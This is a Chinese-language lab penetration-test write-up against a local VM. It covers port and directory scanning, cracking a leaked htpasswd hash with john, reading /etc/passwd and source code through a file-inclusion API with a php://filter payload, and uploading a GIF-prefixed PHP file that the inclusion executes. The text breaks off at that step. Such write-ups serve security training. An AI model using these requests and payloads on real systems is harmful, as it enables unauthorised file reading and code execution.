title="（1）信息收集"></a>（1）信息收集</h3><ul><li>通过netdiscover进行二层发现，发现地址为192.168.101.133主机</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.101.0/24</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626092713572.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626092713572.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626092713572"></p><p>这个工具我在第二次扫的时候一直扫不出来，扫不出来就arp-scan</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626164847570.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626164847570.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626164847570"></p><ul><li>通过ping进行三层发现，根据ttl&#x3D;64初步推测该主机为Linux</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.101.133</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626092952688.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626092952688.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626092952688"></p><ul><li>通过masscan四层发现目标主机开放端口</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p0-65535 --rate=10000 192.168.101.133</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626093143394.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626093143394.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626093143394"></p><p>目标主机开启了80web服务端口，22ssh端口，8011web端口，21ftp端口</p><ul><li><p>扫描目标端口服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -sC -T4 -sS -P0 192.168.101.133 -oN nmap.A</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626094024734.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626094024734.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626094024734"></p><ul><li>目标开启了以下端口及服务：<ul><li>21端口，服务为vsftpd 2.3.5;</li><li>22端口，服务为OpenSSH 5.9p1;且系统为Debian 5 的ubuntu1.10</li><li>80端口，服务为Apacha 2.2.22</li><li>8011端口，服务和80端口一样</li></ul></li></ul><p>使用Nmap中漏洞分类NSE脚本对目标进行探测</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script vuln 192.168.101.133</span><br></pre></td></tr></table></figure><hr><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626094353403.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626094353403.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626094353403"></p><p>openssh和web服务都存在相应的CVE和对应的exp</p><p>访问目标web服务：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626094818002.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626094818002.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626094818002"></p><p>对其web服务进行目录扫描：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.101.133</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626100221981.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626100221981.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626100221981"></p><p>没有有效的信息，development处需要登录</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626100304688.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626100304688.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626100304688"></p><p>用御剑扫出了目标存在index.html.bak，下载下来</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626100635084.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626100635084.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626100635084"></p><p>bak为如下文件，<code>frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0</code>似乎就是用户名和密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>It works!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>This is the default web page for this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The web server software is running but no content has been added, yet.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/development&quot;</span>&gt;</span>development<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- I will use frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0 as the .htpasswd file to protect the development path --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>新建一个1.txt，把<code>frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0</code>写进1.txt，用john工具解密，解密出密码为frank!!!</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101149865.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101149865.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626101149865"></p><p>此时再去development登录，登录成功，显示以下界面：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101350050.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101350050.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626101350050"></p><p>提示具有文件上传接口</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101500282.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101500282.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626101500282"></p><p>再扫一遍发现uploader目录，后续就是想办法文件上传进后台了</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101449725.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626101449725.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626101449725"></p><p>在exploit-db上搜索ssh对应版本的漏洞，或者searchspolit，目标服务器的openssh有用户名枚举漏洞</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625210618990.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625210618990.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230625210618990"></p><p>seebug上看到目标主机存在信息泄露和缓冲区溢出漏洞，还有2010年的拒绝服务漏洞（因该漏洞等级较低，实施拒绝服务也较困难所以无视）</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214035684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214035684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230625214035684"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214249208.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214249208.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230625214249208"></p><p>&#x3D;&#x3D;192.168.101.133主机的22端口存在信息泄露和缓冲区溢出漏洞，seebug还有searchspolit都能找到对应的poc，该轮信息扫描可以用来进行下一步的ssh爆破或溢出漏洞攻击。该信息泄露漏洞也定义为中危。&#x3D;&#x3D;</p><p>&#x3D;&#x3D;同时，该主机web服务目录扫描出development目录和index.html.bak备份文件泄露，文件解密后可以获得后台登录的用户名和密码，进而继续文件上传攻击。由于攻击复杂性和后续危害性未知，但是爆破密码成功，定义为中危&#x3D;&#x3D;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214826294.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214826294.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230625214826294"></p><h3 id="（2）文件上传及api获取shell"><a href="#（2）文件上传及api获取shell" class="headerlink" title="（2）文件上传及api获取shell"></a>（2）文件上传及api获取shell</h3><p>访问192.168.101.133&#x2F;development&#x2F;uploader&#x2F;</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626165850566.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626165850566.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626165850566"></p><p>随便上传一个php文件，提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File is not an image.Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed.Sorry, your file was not uploaded. </span><br></pre></td></tr></table></figure><p>上BP发现PHP怎么都传不上。</p><p>先放弃文件上传</p><h4 id="api"><a href="#api" class="headerlink" title="api"></a>api</h4><p>访问192.168.101.133:8011也就是另一个web端口</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626170634258.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626170634258.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626170634258"></p><p>目录扫描，上dirb：发现&#x2F;api&#x2F;目录，该8011端口是对80端口web服务提供的一些api</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626170800999.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626170800999.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626170800999"></p><p>对下列四个api逐个访问，发现只有files_api.php可用</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626170836976.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626170836976.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626170836976"></p><p>提示需要传递file的参数，并且该api不使用json，以原始格式发送文件名</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626171114731.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626171114731.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626171114731"></p><p>猜测该api为文件访问的api，POST数据：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/files_api.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.101.133:8011</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>16</span><br><span class="line"></span><br><span class="line"><span class="language-gradle"><span class="keyword">file</span>=<span class="regexp">/etc/</span>passwd</span></span><br></pre></td></tr></table></figure><p>注意，必须要加<code>Content-Type:application/w-www-form-urlencoded</code>表示请求体中的数据是URL编码过的，不然<code>=</code>会解析错误(猜的)</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626171820840.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626171820840.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626171820840"></p><p>读取apacha的配置文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/etc/apache2/sites-enabled/000-default</span><br></pre></td></tr></table></figure><p>找到development的路径在<code>/var/www/development</code>，相应的upload.php就在<code>/var/www/development/uploader/upload.php</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626172128787.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626172128787.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626172128787"></p><p>直接读取upload.php，发现直接执行了该文件，那就试试伪协议：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://<span class="built_in">filter</span>/read=convert.base64-encode/resource=/var/www/development/uploader/upload.php</span><br></pre></td></tr></table></figure><p>返回结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKJHRhcmdldF9kaXIgPSAiRlJBTkt1cGxvYWRzLyI7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gYmFzZW5hbWUoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bIm5hbWUiXSk7CiR1cGxvYWRPayA9IDE7CiRpbWFnZUZpbGVUeXBlID0gc3RydG9sb3dlcihwYXRoaW5mbygkdGFyZ2V0X2ZpbGUsUEFUSElORk9fRVhURU5TSU9OKSk7Ci8vIENoZWNrIGlmIGltYWdlIGZpbGUgaXMgYSBhY3R1YWwgaW1hZ2Ugb3IgZmFrZSBpbWFnZQppZihpc3NldCgkX1BPU1RbInN1Ym1pdCJdKSkgewogICAgJGNoZWNrID0gZ2V0aW1hZ2VzaXplKCRfRklMRVNbImZpbGVUb1VwbG9hZCJdWyJ0bXBfbmFtZSJdKTsKICAgIGlmKCRjaGVjayAhPT0gZmFsc2UpIHsKICAgICAgICBlY2hvICJGaWxlIGlzIGFuIGltYWdlIC0gIiAuICRjaGVja1sibWltZSJdIC4gIi4iOwogICAgICAgICR1cGxvYWRPayA9IDE7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIkZpbGUgaXMgbm90IGFuIGltYWdlLiI7CiAgICAgICAgJHVwbG9hZE9rID0gMDsKICAgIH0KfQovLyBDaGVjayBpZiBmaWxlIGFscmVhZHkgZXhpc3RzCmlmIChmaWxlX2V4aXN0cygkdGFyZ2V0X2ZpbGUpKSB7CiAgICBlY2hvICJTb3JyeSwgZmlsZSBhbHJlYWR5IGV4aXN0cy4iOwogICAgJHVwbG9hZE9rID0gMDsKfQovLyBDaGVjayBmaWxlIHNpemUKaWYgKCRfRklMRVNbImZpbGVUb1VwbG9hZCJdWyJzaXplIl0gPiA1MDAwMDApIHsKICAgIGVjaG8gIlNvcnJ5LCB5b3VyIGZpbGUgaXMgdG9vIGxhcmdlLiI7CiAgICAkdXBsb2FkT2sgPSAwOwp9Ci8vIEFsbG93IGNlcnRhaW4gZmlsZSBmb3JtYXRzCmlmKCRpbWFnZUZpbGVUeXBlICE9ICJqcGciICYmICRpbWFnZUZpbGVUeXBlICE9ICJwbmciICYmICRpbWFnZUZpbGVUeXBlICE9ICJqcGVnIgomJiAkaW1hZ2VGaWxlVHlwZSAhPSAiZ2lmIiApIHsKICAgIGVjaG8gIlNvcnJ5LCBvbmx5IEpQRywgSlBFRywgUE5HICYgR0lGIGZpbGVzIGFyZSBhbGxvd2VkLiI7CiAgICAkdXBsb2FkT2sgPSAwOwp9Ci8vIENoZWNrIGlmICR1cGxvYWRPayBpcyBzZXQgdG8gMCBieSBhbiBlcnJvcgppZiAoJHVwbG9hZE9rID09IDApIHsKICAgIGVjaG8gIlNvcnJ5LCB5b3VyIGZpbGUgd2FzIG5vdCB1cGxvYWRlZC4iOwovLyBpZiBldmVyeXRoaW5nIGlzIG9rLCB0cnkgdG8gdXBsb2FkIGZpbGUKfSBlbHNlIHsKICAgIGlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgICAgICBlY2hvICJUaGUgZmlsZSAiLiBiYXNlbmFtZSggJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bIm5hbWUiXSkuICIgaGFzIGJlZW4gdXBsb2FkZWQgdG8gbXkgdXBsb2FkcyBwYXRoLiI7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIlNvcnJ5LCB0aGVyZSB3YXMgYW4gZXJyb3IgdXBsb2FkaW5nIHlvdXIgZmlsZS4iOwogICAgfQp9Cj8+Cgo=</span><br></pre></td></tr></table></figure><p>base64解码后源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target_dir</span> = <span class="string">&quot;FRANKuploads/&quot;</span>;</span><br><span class="line"><span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="variable">$uploadOk</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$imageFileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$target_file</span>,PATHINFO_EXTENSION));</span><br><span class="line"><span class="comment">// Check if image file is a actual image or fake image</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$check</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$check</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is an image - &quot;</span> . <span class="variable">$check</span>[<span class="string">&quot;mime&quot;</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image.&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Check if file already exists</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$target_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, file already exists.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Check file size</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file is too large.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Allow certain file formats</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$imageFileType</span> != <span class="string">&quot;jpg&quot;</span> &amp;&amp; <span class="variable">$imageFileType</span> != <span class="string">&quot;png&quot;</span> &amp;&amp; <span class="variable">$imageFileType</span> != <span class="string">&quot;jpeg&quot;</span></span><br><span class="line">&amp;&amp; <span class="variable">$imageFileType</span> != <span class="string">&quot;gif&quot;</span> ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Check if $uploadOk is set to 0 by an error</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$uploadOk</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file was not uploaded.&quot;</span>;</span><br><span class="line"><span class="comment">// if everything is ok, try to upload file</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span>. <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]). <span class="string">&quot; has been uploaded to my uploads path.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计可知上传路径：<code>FRANKuploads/</code></p><p>在访问upload.php时发现直接执行了php文件，那试试不以php后缀会不会被当作php解析其内容。POST如下数据，文件名为1.gif，加上文件头GIF89a，内容为phpinfo</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/development/uploader/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.101.133</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.101.133/development/uploader/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------322949819912746147301031583637</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>390</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.101.133</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic ZnJhbms6ZnJhbmshISE=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">322949819912746147301031583637</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;fileToUpload&quot;</span>; filename=<span class="string">&quot;1.gif&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">GIF89a</span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">322949819912746147301031583637</span></span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Upload Image</span></span><br><span class="line"><span class="language-php">-----------------------------<span class="number">322949819912746147301031583637</span>--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>访问该gif：看到了phpinfo，证明被解析了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/var/www/development/uploader/FRANKuploads/1.gif</span><br></pre></td></tr></table></figure><p><img 